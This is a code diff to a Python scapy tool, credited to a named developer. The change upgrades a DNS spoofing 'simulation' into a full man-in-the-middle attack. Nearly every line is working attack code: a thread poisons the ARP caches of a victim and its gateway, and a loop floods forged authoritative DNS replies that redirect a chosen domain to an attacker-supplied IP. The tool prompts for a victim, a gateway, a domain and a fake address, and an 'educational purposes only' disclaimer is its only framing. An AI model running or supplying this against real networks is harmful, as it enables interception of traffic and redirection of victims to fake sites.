@@ -1,43 +1,92 @@
-from scapy.all import *
+#!/usr/bin/env python3
+import logging
 import time
 import random
 import signal
 import sys
+import threading
+from scapy.all import *
 
-# Function to handle CTRL+C gracefully
-def signal_handler(sig, frame):
-    print("\n[!] Stopping the DNS Spoofing Simulation...")
-    sys.exit(0)
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Register the signal handler
-signal.signal(signal.SIGINT, signal_handler)
-
-def dns_spoof(victim_ip, dns_server_ip, domain, fake_ip):
+def attacker_mac():
     """
-    Simulates DNS Spoofing attack by continuously sending forged DNS responses.
+    Returns the MAC address of the attacker's default interface.
     """
-    print("\n[*] DNS Spoofing attack started. Press CTRL+C to stop.")
+    try:
+        return get_if_hwaddr(conf.iface)
+    except Exception as e:
+        logging.error(f"Error getting attacker's MAC: {e}")
+        return "00:00:00:00:00:00"
+
+def get_mac(ip):
+    """
+    Returns the MAC address for the given IP by sending an ARP request.
+    """
+    ans, _ = sr(ARP(op=ARP.who_has, pdst=ip), timeout=2, verbose=0)
+    for sent, received in ans:
+        return received.hwsrc
+    return None
+
+def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac):
+    """
+    Restores the ARP tables of the victim and gateway.
+    """
+    logging.info("Restoring ARP tables...")
+    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=0)
+    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=0)
+    logging.info("ARP tables restored.")
+
+def arp_spoof(victim_ip, gateway_ip):
+    """
+    Continuously sends ARP poison packets to the victim and gateway.
+    """
+    victim_mac = get_mac(victim_ip)
+    gateway_mac = get_mac(gateway_ip)
+    if victim_mac is None or gateway_mac is None:
+        logging.error("Failed to obtain MAC addresses. Exiting ARP spoofing thread.")
+        return
+
+    logging.info(f"Victim MAC: {victim_mac} | Gateway MAC: {gateway_mac}")
     try:
         while True:
-            # Craft a DNS response with a fake IP
-            dns_response = IP(dst=victim_ip)/UDP(dport=53)/DNS(id=random.randint(1, 65535), qr=1, 
-                                                      qd=DNSQR(qname=domain, qtype="A"), 
-                                                      an=DNSRR(rrname=domain, ttl=10, rdata=fake_ip))
-            
-            # Send the fake DNS response to the victim
-            send(dns_response, verbose=0)
-            
-            # Print status update
-            print(f"[*] Spoofed {domain} -> {fake_ip} for victim {victim_ip}")
-
-            # Sleep to avoid excessive flooding (adjust as needed)
+            # Tell victim that gateway's IP is at attacker's MAC
+            send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=attacker_mac()), verbose=0)
+            # Tell gateway that victim's IP is at attacker's MAC
+            send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=attacker_mac()), verbose=0)
             time.sleep(2)
+    except KeyboardInterrupt:
+        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
+        sys.exit(0)
 
-    except Exception as e:
-        print(f"[!] Error during spoofing: {e}")
+def dns_spoof(victim_ip, domain, fake_ip):
+    """
+    Continuously sends forged DNS responses to the victim for the specified domain.
+    """
+    logging.info("Starting DNS spoofing...")
+    try:
+        while True:
+            # Craft a spoofed DNS response packet
+            spoofed_pkt = (IP(dst=victim_ip) / UDP(dport=53) /
+                           DNS(id=random.randint(1, 65535), qr=1, aa=1,
+                               qd=DNSQR(qname=domain, qtype="A"),
+                               an=DNSRR(rrname=domain, ttl=10, rdata=fake_ip)))
+            send(spoofed_pkt, verbose=0)
+            logging.info(f"Spoofed {domain} -> {fake_ip} for victim {victim_ip}")
+            time.sleep(1)  # Adjust timing as necessary
+    except KeyboardInterrupt:
+        logging.info("Stopping DNS spoofing...")
+        sys.exit(0)
+
+def signal_handler(sig, frame):
+    logging.info("Exiting gracefully...")
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
 
 def main():
-    # Display disclaimer
+    # Display disclaimer and developer info
     print("===================================")
     print("Disclaimer: This tool is for educational and ethical purposes only.")
     print("By running this tool, you agree not to use it for malicious activities.")
@@ -46,25 +95,23 @@ def main():
     print("\nTool developed by: Sujal Lamichhane\n")
     time.sleep(2)
 
-    print("Proceeding with the DNS Spoofing Simulation Tool...\n")
-    time.sleep(2)
-
-    # Ask user for the victim's IP address, default gateway, and domain details
+    # Gather user inputs
     victim_ip = input("Enter Victim's IP Address: ")
-    dns_server_ip = input("Enter DNS Server's IP Address (Default Gateway): ")
+    gateway_ip = input("Enter Gateway/DNS Server's IP Address: ")
     domain = input("Enter Domain to Spoof (e.g., www.example.com): ")
     fake_ip = input("Enter Fake IP Address to Redirect to (e.g., 192.168.1.100): ")
 
-    # Check for empty inputs and handle errors
-    if not victim_ip or not dns_server_ip or not domain or not fake_ip:
-        print("[!] Error: All fields must be filled. Please try again.")
-        return
+    if not victim_ip or not gateway_ip or not domain or not fake_ip:
+        logging.error("Error: All fields must be filled.")
+        sys.exit(1)
 
-    # Simulate DNS Spoofing Attack
-    dns_spoof(victim_ip, dns_server_ip, domain, fake_ip)
+    # Start ARP spoofing in a separate thread (MITM positioning)
+    arp_thread = threading.Thread(target=arp_spoof, args=(victim_ip, gateway_ip))
+    arp_thread.daemon = True
+    arp_thread.start()
+
+    # Start DNS spoofing (runs continuously until interrupted)
+    dns_spoof(victim_ip, domain, fake_ip)
 
 if __name__ == "__main__":
-    try:
-        main()
-    except Exception as e:
-        print(f"[!] An unexpected error occurred: {e}")
+    main()
